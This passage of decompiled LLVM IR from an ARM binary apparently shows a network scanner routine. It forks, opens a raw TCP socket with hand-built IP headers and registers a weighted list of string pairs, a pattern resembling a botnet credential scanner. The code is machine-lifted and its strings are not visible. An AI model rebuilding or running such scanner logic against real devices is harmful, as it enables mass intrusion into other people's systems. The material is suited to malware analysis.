  %v5_12250 = zext i8 %v4_12250 to i32
  %v3_12254 = load i8, i8* bitcast (i8** @global_var_1d9a4.249 to i8*), align 4
  %v4_12254 = zext i8 %v3_12254 to i32
  %v4_12258 = mul nuw nsw i32 %v5_12250, 256
  %v5_12258 = or i32 %v4_12254, %v4_12258
  %v2_1225c = load i32, i32* %stack_var_-44, align 4
  %v2_12260 = add i32 %v5_12258, %v2_1225c
  store i32 %v2_12260, i32* %r2.global-to-local, align 4
  %v0_12264 = load i32, i32* %r7.global-to-local, align 4
  %v3_12264 = mul i32 %v0_12264, 16
  %v1_12268 = load i32, i32* %sl.global-to-local, align 4
  %v2_12268 = add i32 %v1_12268, %v3_12264
  store i32 %v2_12268, i32* %r3.global-to-local, align 4
  %v0_1226c = load i32, i32* %lr.global-to-local, align 4
  %v1_1226c = add i32 %v0_1226c, 1
  store i32 %v1_1226c, i32* %lr.global-to-local, align 4
  %v3_12270 = sdiv i32 %v2_12260, 256
  store i32 %v3_12270, i32* %r1.global-to-local, align 4
  %v0_12274 = load i32, i32* %r6.global-to-local, align 4
  %v2_12274 = add i32 %v2_12268, 4
  %v3_12274 = inttoptr i32 %v2_12274 to i32*
  store i32 %v0_12274, i32* %v3_12274, align 4
  %v0_12278 = load i32, i32* %lr.global-to-local, align 4
  %v1_12278 = load i32, i32* %r8.global-to-local, align 4
  %v2_12278 = inttoptr i32 %v1_12278 to i32*
  store i32 %v0_12278, i32* %v2_12278, align 4
  %v0_1227c = load i32, i32* %r1.global-to-local, align 4
  %v1_1227c = trunc i32 %v0_1227c to i8
  store i8 %v1_1227c, i8* @global_var_1d9a5.250, align 1
  %v0_12280 = load i32, i32* %r2.global-to-local, align 4
  %v1_12280 = trunc i32 %v0_12280 to i8
  store i8 %v1_12280, i8* bitcast (i8** @global_var_1d9a4.249 to i8*), align 4
  ret i32 ptrtoint (i8** @global_var_1d9a4.249 to i32)

; uselistorder directives
  uselistorder i32 %v1_121e4, { 0, 2, 3, 1 }
  uselistorder i32 %v1_121b8, { 1, 0 }
  uselistorder i32 %v2_121ac, { 1, 0, 2 }
  uselistorder i32 %v1_12178, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1214c, { 1, 0 }
  uselistorder i32 %v2_12140, { 1, 0, 2 }
  uselistorder i32 %v3_12110, { 1, 2, 0 }
  uselistorder i32 %v3_12108, { 1, 2, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 34, { 3, 4, 0, 5, 1, 6, 2, 7 }
  uselistorder i32 (i8*)* @function_1460c, { 28, 29, 9, 10, 11, 12, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86 }
  uselistorder i32 (i32, i32, i32, i32)* @_realloc, { 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
}

define i32 @function_12298() local_unnamed_addr {
dec_label_pc_12298:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp232 = call i32 @__decompiler_undefined_function_0()
  %tmp239 = call i32 @__decompiler_undefined_function_0()
  %tmp240 = call i8* @__decompiler_undefined_function_2()
  %tmp241 = call i32 @__decompiler_undefined_function_0()
  %tmp242 = call i8 @__decompiler_undefined_function_1()
  %stack_var_-38 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-41 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-1842 = alloca i32, align 4
  %stack_var_-1862 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_12298 = load i32, i32* @r4, align 4
  store i32 %v3_12298, i32* %stack_var_-36, align 4
  %v6_12298 = load i32, i32* @r5, align 4
  %v9_12298 = load i32, i32* @r6, align 4
  %v12_12298 = load i32, i32* @r7, align 4
  %v15_12298 = load i32, i32* @r8, align 4
  %v18_12298 = load i32, i32* @sb, align 4
  %v21_12298 = load i32, i32* @sl, align 4
  %v24_12298 = load i32, i32* @fp, align 4
  %v0_122a0 = call i32 @_fork()
  store i32 %v0_122a0, i32* %r0.global-to-local, align 4
  %v7_122a4 = icmp eq i32 %v0_122a0, -1
  %. = zext i1 %v7_122a4 to i32
  %tmp273 = icmp slt i32 %v0_122a0, 1
  %storemerge229 = select i1 %tmp273, i32 %., i32 1
  store i32 %storemerge229, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1d9d0.241 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_122c0 = icmp eq i32 %storemerge229, 0
  store i1 %v2_122c0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_122a0, i32* @global_var_1d9d0.241, align 4
  br i1 %v2_122c0, label %dec_label_pc_122d4, label %dec_label_pc_122cc

dec_label_pc_122cc:                               ; preds = %dec_label_pc_12298
  store i32 %v3_12298, i32* @r4, align 4
  store i32 %v6_12298, i32* %r5.global-to-local, align 4
  store i32 %v9_12298, i32* @r6, align 4
  store i32 %v12_12298, i32* @r7, align 4
  store i32 %v15_12298, i32* @r8, align 4
  store i32 %v18_12298, i32* @sb, align 4
  store i32 %v21_12298, i32* @sl, align 4
  store i32 %v24_12298, i32* @fp, align 4
  ret i32 %v0_122a0

dec_label_pc_122d4:                               ; preds = %dec_label_pc_12298
  %v0_122d4 = call i32 @function_148c4()
  store i32 %v0_122d4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d9ac.143 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_122d4, i32* @global_var_1d9ac.143, align 4
  %v1_122e0 = call i32 @function_11834(i32 %v0_122d4)
  %v0_122e4 = load i32, i32* @r4, align 4
  store i32 %v0_122e4, i32* %r0.global-to-local, align 4
  %v1_122e8 = call i32 @_time(i32 %v0_122e4)
  store i32 ptrtoint (i32* @global_var_1d9a8.243 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v1_122e8, i32* @global_var_1d9a8.243, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_122fc = call i32 @_calloc(i32 256, i32 288)
  store i32 %v2_122fc, i32* %lr.global-to-local, align 4
  %v0_12308 = load i32, i32* @r4, align 4
  store i32 %v0_12308, i32* %stack_var_-52, align 4
  store i32 %v2_122fc, i32* @global_var_1d9c8.255, align 4
  store i32 %v0_12308, i32* %r3.global-to-local, align 4
  store i32 %v0_12308, i32* %r5.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 %v0_12308, i32* %ip.global-to-local, align 4
  %v1_12320 = add i32 %v2_122fc, 4
  store i32 %v1_12320, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12324

dec_label_pc_12324:                               ; preds = %dec_label_pc_12324.dec_label_pc_12324_crit_edge, %dec_label_pc_122d4
  %v0_1233c = phi i32 [ %v0_1233c.pre, %dec_label_pc_12324.dec_label_pc_12324_crit_edge ], [ %v0_12308, %dec_label_pc_122d4 ]
  %v0_1232c = phi i32 [ %v0_12344, %dec_label_pc_12324.dec_label_pc_12324_crit_edge ], [ %v0_12308, %dec_label_pc_122d4 ]
  %v1_12334 = phi i32 [ %v1_12334.pre, %dec_label_pc_12324.dec_label_pc_12324_crit_edge ], [ %v2_122fc, %dec_label_pc_122d4 ]
  %v3_12324 = mul i32 %v0_1232c, 256
  store i32 %v3_12324, i32* %r2.global-to-local, align 4
  %v1_1232c = add i32 %v0_1232c, 1
  store i32 %v1_1232c, i32* %ip.global-to-local, align 4
  %v2_12330 = mul i32 %v0_1232c, 288
  %v2_12334 = add i32 %v1_12334, 12
  %v2_1233c = add i32 %v2_12334, %v2_12330
  %v3_1233c = inttoptr i32 %v2_1233c to i32*
  store i32 %v0_1233c, i32* %v3_1233c, align 4
  %v0_12340 = load i32, i32* %r0.global-to-local, align 4
  %v1_12340 = load i32, i32* %r1.global-to-local, align 4
  %v2_12340 = inttoptr i32 %v1_12340 to i32*
  store i32 %v0_12340, i32* %v2_12340, align 4
  %v3_12340 = load i32, i32* %r1.global-to-local, align 4
  %v4_12340 = add i32 %v3_12340, 288
  store i32 %v4_12340, i32* %r1.global-to-local, align 4
  %v0_12344 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_12344, i32* %r3.global-to-local, align 4
  %v7_12348 = icmp sgt i32 %v1_1232c, 255
  br i1 %v7_12348, label %dec_label_pc_1234c, label %dec_label_pc_12324.dec_label_pc_12324_crit_edge

dec_label_pc_12324.dec_label_pc_12324_crit_edge:  ; preds = %dec_label_pc_12324
  %v1_12334.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1233c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12324

dec_label_pc_1234c:                               ; preds = %dec_label_pc_12324
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 %v0_12344, i32* %stack_var_-52, align 4
  %v3_1235c = call i32 @_socket(i32 2, i32 3, i32 6)
  store i32 %v3_1235c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d9cc.257 to i32), i32* %lr.global-to-local, align 4
  %v2_12364 = icmp eq i32 %v3_1235c, -1
  store i1 %v2_12364, i1* %cpsr_c.global-to-local, align 1
  %v7_12364 = icmp eq i32 %v3_1235c, -1
  store i1 %v7_12364, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_1235c, i32* %r4.global-to-local, align 4
  store i32 %v3_1235c, i32* @global_var_1d9cc.257, align 4
  br i1 %v7_12364, label %dec_label_pc_12cfc, label %dec_label_pc_12374

dec_label_pc_12374:                               ; preds = %dec_label_pc_1234c
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_12378 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12378, i32* %r2.global-to-local, align 4
  %v3_1237c = call i32 @_fcntl(i32 %v3_1235c, i32 3, i32 %v0_12378)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_12384 = or i32 %v3_1237c, 2048
  store i32 %v1_12384, i32* %r2.global-to-local, align 4
  %v0_12388 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12388, i32* %r0.global-to-local, align 4
  %v3_1238c = call i32 @_fcntl(i32 %v0_12388, i32 4, i32 %v1_12384)
  store i32 1, i32* %ip.global-to-local, align 4
  %v2_12398 = load i32, i32* @global_var_1d9cc.257, align 4
  store i32 %v2_12398, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_123a0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_123a0, i32* %r1.global-to-local, align 4
  %v2_123a4 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_123a4, i32* %r3.global-to-local, align 4
  store i32 4, i32* %r4.global-to-local, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v5_123b4 = call i32 @_setsockopt(i32 %v2_12398, i32 %v0_123a0, i32 3, i32 %v2_123a4, i32 4)
  store i32 %v5_123b4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_123b8 = icmp eq i32 %v5_123b4, 0
  store i1 %v2_123b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_123b8, label %dec_label_pc_123c0, label %dec_label_pc_12cf0

dec_label_pc_123c0:                               ; preds = %dec_label_pc_12374, %dec_label_pc_123c0
  %v0_123c0 = call i32 @function_117dc()
  %v3_123c4 = mul i32 %v0_123c0, 65536
  store i32 %v3_123c4, i32* %r0.global-to-local, align 4
  %v1_123d0 = mul i32 %v0_123c0, 256
  %v3_123d4 = and i32 %v1_123d0, 65280
  %tmp276 = udiv i32 %v0_123c0, 256
  %v4_123d8 = urem i32 %tmp276, 256
  %v5_123d8 = or i32 %v4_123d8, %v3_123d4
  store i32 %v5_123d8, i32* %r3.global-to-local, align 4
  %v2_123dc = icmp ugt i32 %v5_123d8, 1023
  store i1 %v2_123dc, i1* %cpsr_c.global-to-local, align 1
  %v7_123dc = icmp eq i32 %v5_123d8, 1024
  store i1 %v7_123dc, i1* %cpsr_z.global-to-local, align 1
  %v3_123e0 = icmp ult i32 %v5_123d8, 1022
  br i1 %v3_123e0, label %dec_label_pc_123c0, label %dec_label_pc_123e4

dec_label_pc_123e4:                               ; preds = %dec_label_pc_123c0
  %v5_123cc.le = trunc i32 %v0_123c0 to i8
  store i32 ptrtoint (i8** @global_var_1d978.259 to i32), i32* %ip.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i8 69, i8* bitcast (i8** @global_var_1d978.259 to i8*), align 4
  store i8 40, i8* bitcast (i32* @global_var_1d97b.260 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1d97a.261 to i8*), align 4
  %v0_12418 = call i32 @function_117dc()
  %v1_12418 = trunc i32 %v0_12418 to i8
  store i32 %v0_12418, i32* %r0.global-to-local, align 4
  %v4_12420 = sext i8 %v5_123cc.le to i32
  %v3_12424 = load i8, i8* @global_var_1d998.264, align 1
  store i32 ptrtoint (i8** @global_var_1d978.259 to i32), i32* %lr.global-to-local, align 4
  %v3_1242c228 = udiv i32 %v4_12420, 256
  store i8 64, i8* bitcast (i32* @global_var_1d980.265 to i8*), align 4
  %v2_12438 = and i32 %v0_12418, 128
  %v3_12438 = icmp ne i32 %v2_12438, 0
  store i1 %v3_12438, i1* %cpsr_c.global-to-local, align 1
  %v4_12438227 = udiv i32 %v0_12418, 256
  store i32 ptrtoint (i32* @global_var_1d98c.263 to i32), i32* %r3.global-to-local, align 4
  %tmp = urem i8 %v3_12424, 16
  %v1_12440 = zext i8 %tmp to i32
  %v1_12444 = trunc i32 %v4_12438227 to i8
  store i8 %v1_12444, i8* bitcast (i32* @global_var_1d97d.266 to i8*), align 4
  %v1_12448 = or i32 %v1_12440, 80
  store i32 %v1_12448, i32* %r1.global-to-local, align 4
  store i32 23, i32* %r2.global-to-local, align 4
  store i32 6, i32* @r6, align 4
  %v1_12454 = trunc i32 %v1_12448 to i8
  store i8 %v1_12454, i8* @global_var_1d998.264, align 1
  %v1_12458 = trunc i32 %v3_1242c228 to i8
  store i8 %v1_12458, i8* bitcast (i32* @global_var_1d98d.267 to i8*), align 4
  store i8 23, i8* bitcast (i32* @global_var_1d98f.268 to i8*), align 4
  store i8 6, i8* bitcast (i32* @global_var_1d981.269 to i8*), align 4
  store i32 %v4_12420, i32* %ip.global-to-local, align 4
  store i8 %v1_12418, i8* bitcast (i32* @global_var_1d97c.270 to i8*), align 4
  store i8 %v5_123cc.le, i8* bitcast (i32* @global_var_1d98c.263 to i8*), align 4
  %v0_12470 = load i32, i32* @r5, align 4
  %v1_12470 = trunc i32 %v0_12470 to i8
  store i8 %v1_12470, i8* bitcast (i32* @global_var_1d98e.271 to i8*), align 4
  %v0_12474 = call i32 @function_117dc()
  %v1_12474 = trunc i32 %v0_12474 to i8
  store i32 ptrtoint (i32* @global_var_1d98c.263 to i32), i32* %lr.global-to-local, align 4
  %v3_1247c = load i8, i8* @global_var_1d999.272, align 1
  %v4_1247c = zext i8 %v3_1247c to i32
  %v2_12480 = and i32 %v0_12474, 128
  %v3_12480 = icmp ne i32 %v2_12480, 0
  store i1 %v3_12480, i1* %cpsr_c.global-to-local, align 1
  %v4_12480 = sdiv i32 %v0_12474, 256
  store i32 %v4_12480, i32* %ip.global-to-local, align 4
  %v1_12484 = or i32 %v4_1247c, 2
  store i32 %v1_12484, i32* %r3.global-to-local, align 4
  %v1_1248c = trunc i32 %v4_12480 to i8
  store i8 %v1_1248c, i8* bitcast (i32* @global_var_1d99b.273 to i8*), align 4
  %v1_12490 = trunc i32 %v1_12484 to i8
  store i8 %v1_12490, i8* @global_var_1d999.272, align 1
  store i8 %v1_12474, i8* bitcast (i32* @global_var_1d99a.274 to i8*), align 4
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_151bc.278 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_124a4 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint (i32* @global_var_151bc.278 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_151c4.280 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_124b4 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint ([6 x i8]* @global_var_151c4.280 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_124c4 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32* %r1.global-to-local, align 4
  %v5_124d4 = call i32 @function_120f4(i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32 7)
  %v0_124d8 = load i32, i32* @r6, align 4
  store i32 %v0_124d8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_151d4.284 to i32), i32* %r1.global-to-local, align 4
  %v4_124e4 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint (i32* @global_var_151d4.284 to i32), i32 %v0_124d8)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_151dc.286 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_124f4 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint ([8 x i8]* @global_var_151dc.286 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_151e4.288 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_12504 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint ([8 x i8]* @global_var_151e4.288 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_151ec.290 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_12514 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint ([9 x i8]* @global_var_151ec.290 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_151f8.292 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_12524 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint (i32* @global_var_151f8.292 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15200.294 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_12534 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint (i32* @global_var_15200.294 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_15208.296 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_15208.296 to i32), i32* %r1.global-to-local, align 4
  %v5_12544 = call i32 @function_120f4(i32 ptrtoint ([8 x i8]* @global_var_15208.296 to i32), i32 ptrtoint ([8 x i8]* @global_var_15208.296 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14f88.298 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_12554 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint (i32* @global_var_14f88.298 to i32), i32 4)
  store i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1504c.300 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_12564 = call i32 @function_120f4(i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32 ptrtoint ([9 x i8]* @global_var_1504c.300 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r1.global-to-local, align 4
  %v5_12574 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15058.302 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_12584 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint (i32* @global_var_15058.302 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_15060.304 to i32), i32* %r0.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_15060.304 to i32), i32* %r1.global-to-local, align 4
  %v5_12594 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_15060.304 to i32), i32 ptrtoint ([5 x i8]* @global_var_15060.304 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14f88.298 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_125a4 = call i32 @function_120f4(i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32 ptrtoint (i32* @global_var_14f88.298 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_15068.306 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_125b4 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint ([5 x i8]* @global_var_15068.306 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15070.308 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_125c4 = call i32 @function_120f4(i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32 ptrtoint (i32* @global_var_15070.308 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1507c.310 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_125d4 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint (i32* @global_var_1507c.310 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_15084.312 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_125e4 = call i32 @function_120f4(i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32 ptrtoint ([9 x i8]* @global_var_15084.312 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1507c.310 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_125f4 = call i32 @function_120f4(i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32 ptrtoint (i32* @global_var_1507c.310 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15090.314 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_12604 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint (i32* @global_var_15090.314 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1504c.300 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_12614 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint ([9 x i8]* @global_var_1504c.300 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15098.316 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_12624 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint (i32* @global_var_15098.316 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_150a0.318 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_12634 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint (i32* @global_var_150a0.318 to i32), i32 1)
  store i32 ptrtoint ([14 x i8]* @global_var_150a8.320 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_150b8.322 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_12644 = call i32 @function_120f4(i32 ptrtoint ([14 x i8]* @global_var_150a8.320 to i32), i32 ptrtoint ([7 x i8]* @global_var_150b8.322 to i32), i32 1)
  store i32 ptrtoint ([8 x i8]* @global_var_150c0.324 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_150c0.324 to i32), i32* %r1.global-to-local, align 4
  %v5_12654 = call i32 @function_120f4(i32 ptrtoint ([8 x i8]* @global_var_150c0.324 to i32), i32 ptrtoint ([8 x i8]* @global_var_150c0.324 to i32), i32 1)
  store i32 ptrtoint ([11 x i8]* @global_var_150c8.326 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_150c8.326 to i32), i32* %r1.global-to-local, align 4
